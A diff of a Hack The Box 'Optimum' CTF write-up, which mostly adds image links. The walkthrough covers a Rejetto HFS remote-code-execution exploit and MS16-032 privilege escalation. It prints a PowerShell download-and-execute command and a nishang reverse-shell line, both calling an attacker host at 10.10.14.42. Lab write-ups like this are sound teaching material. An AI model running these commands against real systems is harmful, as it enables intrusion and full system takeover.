@@ -1,12 +1,12 @@
 # Optimum [HTB]()
-![optimum-01]()
+![optimum-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/optimum-01.png)
 
 
 ## Recon
 
 I start by adding the target to `/etc/hosts` :
 
-![hosts-02]()
+![hosts-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/hosts-02.png)
 
 From here i use `nmap` to scan the target:
 
@@ -14,7 +14,7 @@ From here i use `nmap` to scan the target:
 nmap -sC -sV -A -p- optimum.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/nmap-res-03.png)
 
 
 We have a single port open, appears to be running an HTTP file server. Lets take a look at it.
@@ -25,21 +25,21 @@ We have a single port open, appears to be running an HTTP file server. Lets take
 
 Lets open the site through our browsers at `http://optimum.htb`
 
-![site-04]()
+![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/site-04.png)
 
 
 No files are hosted on the site at the moment. However, two things jump to my mind, the login link, and 
 the version at the buttom. We could try to break the authintication logic, but if we hover over the 
 version link we can see the file server is running `Rejetto`, which can also be seen from the page source:
 
-![rejjeto-05]()
+![rejjeto-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/rejjeto-05.png)
 
 If we search Goolge for exploits we can find an RCE exploit from [ExploitDB](https://www.exploit-db.com/exploits/39161). The script looks like Python 2, it says we need to have a web server hosting `nc.exe`, 
 and we need to setup a listener manually. Lets give it a shot. 
 
 After i download the file, i update my local IP and port information:
 
-![exploit-06]()
+![exploit-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/exploit-06.png)
 
 Now i grab a copy of `/usr/share/windows-resources/binaries/nc.exe` to my current working directory 
 and start a Python web server with:
@@ -60,7 +60,7 @@ Now we execute the exploit with:
 python2 rejetto_rce.py optimum.htb 80
 ```
 
-![shell-07]()
+![shell-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/shell-07.png)
 
 After a couple of executions i get a shell. First run it grabbed `nc.exe` from my server, second time 
 it connected with the shell. 
@@ -103,7 +103,7 @@ Nothing comes up.
 So i decided to generate `systeminfo` output and run [windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) againts it. 
 
 
-![sysinfo-08]()
+![sysinfo-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/sysinfo-08.png)
 
 
 We are up againts an X64 Windows 2012 R2 server. The exploit suggester returned quite a lot of potential 
@@ -156,7 +156,7 @@ machines, which our target is. But instad, the exploit terminated saying, our ma
 
 There was another exploit i tried a few times, `ms16-032`:
 
-![exploit-suggester-09]()
+![exploit-suggester-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/exploit-suggester-09.png)
 
 Previously, i tried the `metasploit` version, this failed so i decided to move on. However this time, 
 i found a PowerShell version of the exploit [here](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1). 
@@ -164,13 +164,13 @@ i found a PowerShell version of the exploit [here](https://github.com/EmpireProj
 
 If we take a look at the source code, we can see we need to invoke the function and specify a command to run as SYSTEM:
 
-![exploit-10]()
+![exploit-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/exploit-10.png)
 
 We can host nishang's reverse powershell script on a python server, setup a listener and run the exploit. 
 
 First step, download the exploit to you kali, and invoke the funciton at the buttom:
 
-![invoke-11]()
+![invoke-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/invoke-11.png)
 
 ```powershell
 Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.42/rshell.ps1')"
@@ -180,7 +180,7 @@ Next, download [nishang](https://github.com/samratashok/nishang/blob/master/Shel
 
 Add the following line at the end of the script:
 
-![nishang-12]()
+![nishang-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/nishang-12.png)
 
 ```powershell
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.42 -Port 9001
@@ -206,5 +206,5 @@ C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe "C:\Users\kostas\Desk
 
 This should give you a shell as the SYSTEM:
 
-![root-13]()
+![root-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Optimum/img/root-13.png)
 
